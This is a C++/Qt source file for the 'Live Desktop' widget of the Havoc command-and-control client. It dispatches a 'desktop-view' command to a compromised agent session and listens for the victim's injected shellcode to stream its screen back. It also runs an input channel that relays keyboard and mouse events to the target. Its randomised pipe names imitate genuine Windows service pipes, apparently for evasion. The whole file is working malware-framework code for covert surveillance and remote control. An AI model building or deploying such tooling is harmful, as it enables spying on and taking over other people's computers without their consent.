#include <global.hpp>
#include <UserInterface/Widgets/LiveDesktopWidget.hpp>
#include <UserInterface/Widgets/DemonInteracted.h>

#include <QCoreApplication>
#include <QDir>
#include <QFile>
#include <QFileInfo>
#include <QMessageBox>
#include <QRandomGenerator>
#include <QDataStream>
#include <QDateTime>
#include <QtEndian>

using namespace HavocNamespace::UserInterface::Widgets;

namespace
{
    const QStringList kPipePrefixes = {
        "SapIServerPipes-1-5-5-0",
        "epmapper-",
        "atsvc-",
        "plugplay+",
        "srvsvc-1-5-5-0",
        "W32TIME_ALT_",
        "tapsrv_",
        "Printer_Spools_",
    };

    const QByteArray kMagic = QByteArray( "LVDKTP\x00", 7 );
    constexpr int kConnDesktop = 0;
    constexpr int kConnInput   = 1;

    constexpr quint8 kCK0 = 255, kCK1 = 174, kCK2 = 201;

    QString randomDigits( int n )
    {
        QString s;
        for ( int i = 0; i < n; i++ ) {
            s.append( QChar( '0' + QRandomGenerator::global()->bounded( 10 ) ) );
        }
        return s;
    }

    QString randomPipeName()
    {
        int idx = QRandomGenerator::global()->bounded( kPipePrefixes.size() );
        return QStringLiteral( "\\\\.\\pipe\\" ) + kPipePrefixes.at( idx ) + randomDigits( 4 );
    }
}

// LZNT1 decompression — matches the shellcode's RtlCompressBuffer(COMPRESSION_FORMAT_LZNT1) output.
// Each chunk has a 2-byte LE header: bit 15 = compressed flag, bits 0-11 = (size-1).
// Compressed chunks use a flags byte per 8 tokens; bit=0 → literal, bit=1 → back-reference
// (displacement/length split adapts based on output position within the chunk).
QByteArray LiveDesktopWidget::lznt1Decompress( const QByteArray& src )
{
    QByteArray out;
    out.reserve( src.size() * 4 );

    const auto* s = reinterpret_cast<const quint8*>( src.constData() );
    int i   = 0;
    int end = src.size();

    while ( i + 1 < end )
    {
        quint16 hdr = s[i] | ( s[i + 1] << 8 );
        i += 2;
        if ( hdr == 0 ) break;

        int csz = ( hdr & 0xFFF ) + 1;
        int ce  = qMin( i + csz, end );

        if ( !( hdr & 0x8000 ) ) {
            out.append( reinterpret_cast<const char*>( s + i ), ce - i );
            i = ce;
            continue;
        }

        int cstart = out.size();
        while ( i < ce )
        {
            if ( i >= end ) break;
            quint8 flags = s[i]; i++;

            for ( int bit = 0; bit < 8; bit++ )
            {
                if ( i >= ce ) break;

                if ( !( flags & ( 1 << bit ) ) ) {
                    out.append( static_cast<char>( s[i] ) );
                    i++;
                } else {
                    if ( i + 1 >= end ) { i = ce; break; }
                    quint16 tok = s[i] | ( s[i + 1] << 8 );
                    i += 2;

                    int pos = out.size() - cstart;
                    if ( pos <= 0 ) continue;

                    int bl = 0;
                    { int tmp = pos; while ( tmp ) { tmp >>= 1; bl++; } }
                    int db = qMax( 4, bl );

                    int lb = 16 - db;
                    int ln = ( tok & ( ( 1 << lb ) - 1 ) ) + 3;
                    int dp = ( tok >> lb ) + 1;

                    for ( int j = 0; j < ln; j++ ) {
                        int idx = out.size() - dp;
                        out.append( ( idx >= 0 && idx < out.size() )
                                    ? out.at( idx ) : '\0' );
                    }
                }
            }
        }
        i = qMax( i, ce );
    }
    return out;
}

// Merge a pixel-diff frame into the accumulated framebuffer.
// The shellcode marks unchanged BGR triplets with the color key (255, 174, 201);
// those are skipped so dst retains the previous frame's value. Changed pixels
// are copied from src into dst. Data is flat BGR, stride = width*3 (no padding).
void LiveDesktopWidget::mergePixelDiff( QByteArray& dst, const QByteArray& src, int size )
{
    const auto* sp = reinterpret_cast<const quint8*>( src.constData() );
    auto*       dp = reinterpret_cast<quint8*>( dst.data() );
    int lim = qMin( size, qMin( src.size(), dst.size() ) );

    for ( int i = 0; i + 2 < lim; i += 3 )
    {
        if ( sp[i] == kCK0 && sp[i + 1] == kCK1 && sp[i + 2] == kCK2 )
            continue;
        dp[i]     = sp[i];
        dp[i + 1] = sp[i + 1];
        dp[i + 2] = sp[i + 2];
    }
}

void LiveDesktopWidget::setupUi( QWidget* Form )
{
    LiveDesktopTabWidget = Form;

    if ( Form->objectName().isEmpty() )
        Form->setObjectName( QStringLiteral( "LiveDesktopForm" ) );

    auto* mainLayout = new QVBoxLayout( Form );
    mainLayout->setContentsMargins( 4, 4, 4, 4 );
    mainLayout->setSpacing( 4 );

    // -- connection panel (compact, at top) --
    groupConnection = new QGroupBox( "Connection", Form );
    auto* connLayout = new QHBoxLayout( groupConnection );
    connLayout->setContentsMargins( 6, 6, 6, 6 );
    connLayout->setSpacing( 4 );

    labelServer = new QLabel( "Server:", groupConnection );
    comboServer = new QComboBox( groupConnection );
    comboServer->setEditable( true );
    comboServer->setInsertPolicy( QComboBox::NoInsert );
    comboServer->setMinimumWidth( 140 );
    populateServerHosts();

    labelPort = new QLabel( "Port:", groupConnection );
    editPort  = new QLineEdit( "1337", groupConnection );
    editPort->setMaximumWidth( 70 );

    labelPipe = new QLabel( "Pipe:", groupConnection );
    editPipe  = new QLineEdit( randomPipeName(), groupConnection );
    editPipe->setMinimumWidth( 180 );

    buttonRegenerate = new QPushButton( "New Pipe", groupConnection );
    buttonStart      = new QPushButton( "Start", groupConnection );

    connLayout->addWidget( labelServer );
    connLayout->addWidget( comboServer );
    connLayout->addWidget( labelPort );
    connLayout->addWidget( editPort );
    connLayout->addWidget( labelPipe );
    connLayout->addWidget( editPipe );
    connLayout->addWidget( buttonRegenerate );
    connLayout->addWidget( buttonStart );

    mainLayout->addWidget( groupConnection );

    // -- viewer area --
    scrollArea = new QScrollArea( Form );
    scrollArea->setWidgetResizable( true );
    scrollArea->setStyleSheet( "QScrollArea { background: #0d0d0d; border: none; }" );

    labelView = new QLabel();
    labelView->setAlignment( Qt::AlignCenter );
    labelView->setStyleSheet( "background: #0d0d0d;" );
    labelView->setSizePolicy( QSizePolicy::Ignored, QSizePolicy::Ignored );
    labelView->setMinimumSize( 320, 240 );
    scrollArea->setWidget( labelView );

    mainLayout->addWidget( scrollArea, 1 );

    // -- status bar --
    statusLabel = new QLabel( "Idle — click Start to begin", Form );
    statusLabel->setStyleSheet(
        "QLabel { background: #1e1e2e; color: #a6e3a1; padding: 4px 8px; font-family: monospace; font-size: 9pt; }" );
    mainLayout->addWidget( statusLabel );

    // -- connections --
    connect( buttonRegenerate, &QPushButton::clicked, this, &LiveDesktopWidget::onRegenerateClicked );
    connect( buttonStart,      &QPushButton::clicked, this, &LiveDesktopWidget::onStartClicked );

    // -- render timer (60fps) --
    renderTimer = new QTimer( this );
    renderTimer->setInterval( 16 );
    connect( renderTimer, &QTimer::timeout, this, &LiveDesktopWidget::onRenderTick );
}

void LiveDesktopWidget::populateServerHosts()
{
    QString current = comboServer->currentText().trimmed();
    comboServer->clear();

    QSet<QString> seen;

    for ( const auto& ip : HavocX::Teamserver.IpAddresses ) {
        if ( ! seen.contains( ip ) ) {
            comboServer->addItem( ip );
            seen.insert( ip );
        }
    }

    for ( const auto& listener : HavocX::Teamserver.Listeners ) {
        if ( listener.Status == "Offline" )
            continue;

        if ( listener.Protocol == HavocSpace::Listener::PayloadHTTP.toStdString() ||
             listener.Protocol == HavocSpace::Listener::PayloadHTTPS.toStdString() )
        {
            try {
                auto info = std::any_cast<HavocSpace::Listener::HTTP>( listener.Info );
                for ( const auto& host : info.Hosts ) {
                    QString h = host.trimmed();
                    if ( ! h.isEmpty() && ! seen.contains( h ) ) {
                        comboServer->addItem( h );
                        seen.insert( h );
                    }
                }
            } catch ( ... ) {}
        }
    }

    if ( comboServer->count() == 0 )
        comboServer->addItem( "127.0.0.1" );

    if ( ! current.isEmpty() ) {
        int idx = comboServer->findText( current );
        if ( idx >= 0 )
            comboServer->setCurrentIndex( idx );
        else
            comboServer->setCurrentText( current );
    }
}

void LiveDesktopWidget::dispatch( const QString& command )
{
    for ( auto& Session : HavocX::Teamserver.Sessions )
    {
        if ( Session.Name.compare( SessionID ) == 0 )
        {
            if ( Session.InteractedWidget && Session.InteractedWidget->DemonCommands ) {
                Session.InteractedWidget->AppendText( command );
            }
            return;
        }
    }
}

void LiveDesktopWidget::regenerateNames()
{
    editPipe->setText( randomPipeName() );
}

void LiveDesktopWidget::onRegenerateClicked()
{
    regenerateNames();
}

void LiveDesktopWidget::sendInt( QTcpSocket* s, qint32 v )
{
    qint32 le = qToLittleEndian( v );
    s->write( reinterpret_cast<const char*>( &le ), 4 );
}

void LiveDesktopWidget::requestFrame()
{
    if ( ! deskSocket || deskSocket->state() != QAbstractSocket::ConnectedState )
        return;

    int cw, ch;
    if ( screenW > 0 && screenH > 0 ) {
        cw = ( screenW + 3 ) & ~3;
        ch = screenH;
    } else {
        cw = 8192;
        ch = 8192;
    }

    sendInt( deskSocket, cw );
    sendInt( deskSocket, ch );
    deskSocket->flush();

    readState = WaitFrameFlag;
}

void LiveDesktopWidget::onStartClicked()
{
    if ( tcpServer ) {
        tcpServer->close();
        delete tcpServer;
        tcpServer = nullptr;

        if ( deskSocket ) {
            deskSocket->disconnectFromHost();
            deskSocket = nullptr;
        }
        if ( inputSocket ) {
            inputSocket->disconnectFromHost();
            inputSocket = nullptr;
        }

        renderTimer->stop();
        buttonStart->setText( "Start" );
        statusLabel->setText( "Stopped" );
        labelView->clear();
        pixBuf.clear();
        frameW = frameH = 0;
        frameCount = 0;
        return;
    }

    populateServerHosts();

    const QString server = comboServer->currentText().trimmed();
    const QString port   = editPort->text().trimmed();
    const QString pipe   = editPipe->text().trimmed();

    if ( server.isEmpty() || port.isEmpty() ) {
        QMessageBox::warning( LiveDesktopTabWidget, "Live Desktop", "Server and port are required." );
        return;
    }

    bool ok = false;
    quint16 portNum = port.toUShort( &ok );
    if ( ! ok || portNum == 0 ) {
        QMessageBox::warning( LiveDesktopTabWidget, "Live Desktop", "Invalid port number." );
        return;
    }

    tcpServer = new QTcpServer( this );
    connect( tcpServer, &QTcpServer::newConnection, this, &LiveDesktopWidget::onNewConnection );

    if ( ! tcpServer->listen( QHostAddress::Any, portNum ) ) {
        QMessageBox::warning( LiveDesktopTabWidget, "Live Desktop",
                              "Failed to listen on port " + port + ":\n" + tcpServer->errorString() );
        delete tcpServer;
        tcpServer = nullptr;
        return;
    }

    statusLabel->setText( "Listening on :" + port + " — waiting for agent..." );
    buttonStart->setText( "Stop" );
    renderTimer->start();

    QString cmd = "desktop-view " + server + " " + port;
    if ( ! pipe.isEmpty() ) cmd += " " + pipe;
    dispatch( cmd );
}

// LVDKTP handshake: 7-byte magic "LVDKTP\0" then a 4-byte LE int for connection
// type — desktop (0) or input (1). Desktop connections drive the frame loop;
// input connections relay mouse/keyboard events back to the target.
void LiveDesktopWidget::onNewConnection()
{
    QTcpSocket* sock = tcpServer->nextPendingConnection();
    if ( ! sock ) return;

    readState = WaitMagic;
    readBuf.clear();

    connect( sock, &QTcpSocket::readyRead, this, [this, sock]() {
        readBuf.append( sock->readAll() );

        if ( readState == WaitMagic ) {
            if ( readBuf.size() < 7 ) return;
            if ( readBuf.left( 7 ) != kMagic ) {
                statusLabel->setText( "Bad magic from agent — closing" );
                sock->disconnectFromHost();
                return;
            }
            readBuf.remove( 0, 7 );
            readState = WaitConnType;
        }

        if ( readState == WaitConnType ) {
            if ( readBuf.size() < 4 ) return;
            qint32 ct = qFromLittleEndian<qint32>( readBuf.constData() );
            readBuf.remove( 0, 4 );

            if ( ct == kConnDesktop ) {
                deskSocket = sock;
                statusLabel->setText( "Desktop stream connected" );
                disconnect( sock, &QTcpSocket::readyRead, nullptr, nullptr );
                connect( sock, &QTcpSocket::readyRead,    this, &LiveDesktopWidget::onDeskReadyRead );
                connect( sock, &QTcpSocket::disconnected,  this, &LiveDesktopWidget::onDeskDisconnected );
                requestFrame();
            } else if ( ct == kConnInput ) {
                inputSocket = sock;
                statusLabel->setText( statusLabel->text() + "  |  Input channel connected" );
                sendInt( sock, 0 );
            } else {
                sock->disconnectFromHost();
            }
        }
    });
}

// Frame protocol (all ints are 4-byte LE):
//   viewer → shellcode:  (requestedWidth, requestedHeight)
//   shellcode → viewer:  flag (0 = no change, 1 = new frame)
//   if flag==1:          screenW, screenH, frameW, frameH, compressedSize
//                        then compressedSize bytes of LZNT1-compressed pixel data
//   viewer → shellcode:  ack (0)
//
// Pixel data is bottom-up BGR with stride = frameW*3 (width forced to multiple
// of 4 by the shellcode, so stride is always DWORD-aligned with no padding).
// Frames after the first carry pixel diffs: unchanged triplets are replaced
// with the color key (255,174,201) and merged via mergePixelDiff.
void LiveDesktopWidget::onDeskReadyRead()
{
    if ( ! deskSocket ) return;
    readBuf.append( deskSocket->readAll() );

    for ( ;; )
    {
        if ( readState == WaitFrameFlag )
        {
            if ( readBuf.size() < 4 ) return;
            qint32 has = qFromLittleEndian<qint32>( readBuf.constData() );
            readBuf.remove( 0, 4 );

            if ( ! has ) {
                requestFrame();
                return;
            }
            readState = WaitFrameHeader;
        }

        if ( readState == WaitFrameHeader )
        {
            if ( readBuf.size() < 20 ) return;
            const char* d = readBuf.constData();
            screenW              = qFromLittleEndian<qint32>( d );
            screenH              = qFromLittleEndian<qint32>( d + 4 );
            pendingFW            = qFromLittleEndian<qint32>( d + 8 );
            pendingFH            = qFromLittleEndian<qint32>( d + 12 );
            pendingCompressedSize = qFromLittleEndian<qint32>( d + 16 );
            readBuf.remove( 0, 20 );
            readState = WaitFrameData;
        }

        if ( readState == WaitFrameData )
        {
            if ( readBuf.size() < pendingCompressedSize ) return;

            QByteArray comp = readBuf.left( pendingCompressedSize );
            readBuf.remove( 0, pendingCompressedSize );

            int rawSize = pendingFW * 3 * pendingFH;
            QByteArray raw = lznt1Decompress( comp );

            qDebug( "LiveDesktop frame: fw=%d fh=%d compressed=%d decompressed=%d expected=%d diff=%d",
                    pendingFW, pendingFH, pendingCompressedSize,
                    (int)raw.size(), rawSize, (int)raw.size() - rawSize );

            if ( raw.size() < rawSize )
                raw.append( QByteArray( rawSize - raw.size(), '\0' ) );

            frameMutex.lock();
            if ( pixBuf.isEmpty() || frameW != pendingFW || frameH != pendingFH ) {
                pixBuf = raw.left( rawSize );
            } else {
                mergePixelDiff( pixBuf, raw, rawSize );
            }
            frameW = pendingFW;
            frameH = pendingFH;
            lastDecompSize = raw.size();
            lastExpectedSize = rawSize;
            frameCount++;
            frameDirty = true;
            frameMutex.unlock();

            sendInt( deskSocket, 0 );
            deskSocket->flush();

            readState = WaitFrameFlag;
            requestFrame();
            return;
        }
    }
}

void LiveDesktopWidget::onDeskDisconnected()
{
    deskSocket = nullptr;
    statusLabel->setText( "Desktop stream disconnected" );
}

// Convert the accumulated BGR bottom-up framebuffer to a displayable QPixmap.
// Row flip is done manually because QImage::mirrored() introduces a diagonal
// lean on certain widths due to an internal stride mismatch.
// BGR→RGB is explicit per-pixel into Format_RGB32 (always DWORD-aligned) to
// avoid Format_BGR888 colour artefacts on some Qt builds.
//
// Capture-side colour: the shellcode must CROP 1-3 px to DWORD-align 24-bpp
// rows. StretchBlt+HALFTONE on that tiny "resize" dithers the whole frame
// and is what made the live view look "almost the right colour".
// On frame #1 the raw decompressed data is saved as /tmp/livedesktop_debug.bmp
// for offline verification — the BMP is the exact bytes from LZNT1, no Qt processing.
void LiveDesktopWidget::onRenderTick()
{
    if ( ! frameDirty ) return;

    frameMutex.lock();
    if ( pixBuf.isEmpty() || frameW == 0 || frameH == 0 ) {
        frameMutex.unlock();
        return;
    }
    int w = frameW;
    int h = frameH;
    QByteArray data = pixBuf;
    int fc = frameCount;
    frameDirty = false;
    frameMutex.unlock();

    int stride = w * 3;
    int sz = stride * h;
    if ( data.size() < sz ) return;

    const uchar* bits = reinterpret_cast<const uchar*>( data.constData() );

    if ( fc == 1 ) {
        QFile bmp( "/tmp/livedesktop_debug.bmp" );
        if ( bmp.open( QIODevice::WriteOnly ) ) {
            quint8 hdr[54] = {};
            hdr[0] = 'B'; hdr[1] = 'M';
            quint32 fileSize = 54 + sz;
            memcpy( hdr + 2, &fileSize, 4 );
            quint32 offBits = 54;
            memcpy( hdr + 10, &offBits, 4 );
            quint32 hdrSz = 40;
            memcpy( hdr + 14, &hdrSz, 4 );
            qint32 bw = w, bh = h;
            memcpy( hdr + 18, &bw, 4 );
            memcpy( hdr + 22, &bh, 4 );
            hdr[26] = 1;
            hdr[28] = 24;
            bmp.write( reinterpret_cast<const char*>( hdr ), 54 );
            bmp.write( data.constData(), sz );
            bmp.close();
            qDebug( "LiveDesktop: saved /tmp/livedesktop_debug.bmp %dx%d stride=%d sz=%d", w, h, stride, sz );
        }
    }

    QImage img( w, h, QImage::Format_RGB32 );
    for ( int y = 0; y < h; y++ ) {
        QRgb* dst = reinterpret_cast<QRgb*>( img.scanLine( y ) );
        const uchar* src = bits + ( h - 1 - y ) * stride;
        for ( int x = 0; x < w; x++ ) {
            dst[x] = qRgb( src[x * 3 + 2], src[x * 3 + 1], src[x * 3] );
        }
    }
    QPixmap pm = QPixmap::fromImage( img );

    QSize viewSize = scrollArea->viewport()->size();
    if ( pm.width() > viewSize.width() || pm.height() > viewSize.height() )
        pm = pm.scaled( viewSize, Qt::KeepAspectRatio, Qt::FastTransformation );

    labelView->setPixmap( pm );
    int ds = lastDecompSize;
    int es = lastExpectedSize;
    statusLabel->setText( QString( "Live — %1x%2 -> %3x%4  frame#%5  raw=%6 exp=%7" )
                          .arg( screenW ).arg( screenH )
                          .arg( w ).arg( h ).arg( fc )
                          .arg( ds ).arg( es ) );
}
